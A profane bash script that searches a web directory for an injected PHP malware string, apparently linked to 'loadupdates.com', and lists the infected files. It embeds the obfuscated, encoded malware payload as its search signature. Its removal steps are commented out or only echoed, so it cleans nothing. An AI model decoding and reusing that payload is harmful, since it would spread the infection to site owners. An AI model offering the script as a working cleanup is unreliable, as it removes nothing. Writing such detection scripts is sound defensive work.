#!/bin/bash
#
# Effin NSA/KGB(?) code all over the place.. Making a sweet fuckin mess... This is a find & replace, works recursively from the CWD
#

##### VARS ######
#SEARCH_STRING=`cat MalwareIssue-20161029-SearchString.txt`
SEARCH_STRING="nJLtXPScp3AyqPtxnJW2XFxtrlNtMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFxtrlOyL2uiVPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKGftsFOyoUAyVUfXWUIloPN9VPWbqUEjBv8ioT9uMUIjMTS0MKZhL29gY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0cYvVzMQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMcCGRznQ0vYz1xAFtvZwSxLGVkAwqzBJEvBTSwAwV4ZwLkMGp3AQyvLJH1ZwDkZFVcBjccMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcB2A1pzksp2I0o3O0XPEwqKWfYPOQIIWZG1OHK0ACGx5SD1EHFH1SG1IHYPN1XGftL3IloS9mMKEipUDbWTA1pzjfVRAIHxkCHSEsIRyAEH9IIPjtAFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvEcLaLtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjc9VTIfp2IcMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsDccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtoJD1XT1xAFtxK1WSHIISH1EoVaNvKFxcVQ09VPVkAwN0MwH5ZmxjZwp3ZGVlBGp1BJDjMQHkAGyzA2HkLvVcVUftMKMuoPumqUWcpUAfLKAbMKZbWS9FEISIEIAHJlWwVy0cXGftsDcyL2uiVPEcLaL7PtxWPK0tsD"
REPLACE_STRING=""
AFFECTED_FILE_LIST=$0.affectedFiles
BASE_DIR=$1


### MAIN BEGINS
if [ $# -ne 1 ]; then
	echo -e "Usage: ./$0 [base directory to recursive in to]"
	echo -e "\n\nNote that if you use an input file with \" characters, you must escape them, you sack of...\\\""
	exit 1
fi

### FIRST WE'LL MAKE A LIST OF FILENAMES, ONE PER LINE, THAT PROBABLY CONTAIN THE INJECTED FUCKERY
echo -e "\n\nBeginning search in $BASE_DIR"
echo "grep -Rl \"$SEARCH_STRING\" $BASE_DIR > $AFFECTED_FILE_LIST"
echo -e "\n\n"
grep -Rl "$SEARCH_STRING" $BASE_DIR > $AFFECTED_FILE_LIST
NUMBER_OF_AFFECTED_FILES=$(wc -l < "$AFFECTED_FILE_LIST")

if [ $NUMBER_OF_AFFECTED_FILES -lt 1 ]; then
	echo -e "No affected files were found under `pwd`. Halting."
	exit 0
fi

echo -e "$NUMBER_OF_AFFECTED_FILES affected files are reported in \"$AFFECTED_FILE_LIST\""


### ITERATE THROUGH THE AFFECTED FILES, DO SOMETHING ABOUT IT
for infectedFile in `cat $AFFECTED_FILE_LIST`
do
	## SED EFFORTS
	#Probably cripples the script. - but I think I've got that handled another way now
	#sed -i 's#$strings($light);#$light = ""; $strings($light);#' $infectedFile 

	#sed -n '1h;1!H;${g;s/`echo MalwareIssue-20161112-SearchString-Escaped.txt`/\/\/loadupdates.com malware removed/;p;}' $infectedFile > $infectedFile
	#sed -n '1h;1!H;${g;s/`echo MalwareIssue-20161029-SearchString.txt`/\/\/loadupdates.com malware removed/;p;}' $infectedFile > $infectedFile
	

	## PERL (Necklaces)
	#SEARCH=`echo MalwareIssue-20161112-SearchString-Escaped.txt`
	#perl -0pe 's/$SEARCH/\/\/loadupdates.com malware removed/' $infectedFile

	## SGREP
	echo sgrep -o '%r\n' '(start .. end) extracting ("<?php".."?>" containing "###=CACHE START=###")' $infectedFile
done

echo -e "Well, that's it."
